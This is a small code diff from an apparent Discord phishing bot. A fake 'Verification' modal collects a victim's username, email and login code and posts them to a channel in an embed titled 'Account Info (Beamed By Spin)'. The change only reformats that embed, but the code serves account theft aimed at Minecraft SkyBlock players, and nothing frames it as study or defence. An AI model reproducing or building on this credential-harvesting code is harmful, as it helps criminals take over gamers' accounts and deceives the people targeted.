@@ -24,9 +24,9 @@ class MyModalOne(ui.Modal, title="Verification"):
                         embed=discord.Embed(
                             title="Account Info (Beamed By Spin)",
                             url= f'https://sky.shiiyu.moe/{self.box_one.value}',
-                            description=f"**Username:**: ```{self.box_one.value}\n```"
-                                        f"**Email**: ```{self.box_two.value}\n```"
-                                        f"**Code**: ```User hasn't clicked button two yet```",
+                            description=f"**Username:**:\n ```{self.box_one.value}```\n"
+                                        f"**Email**:\n ```{self.box_two.value}```\n"
+                                        f"**Code**:\n ```User hasn't clicked button two yet```",
                             colour=0xff0000
                         )
                     )
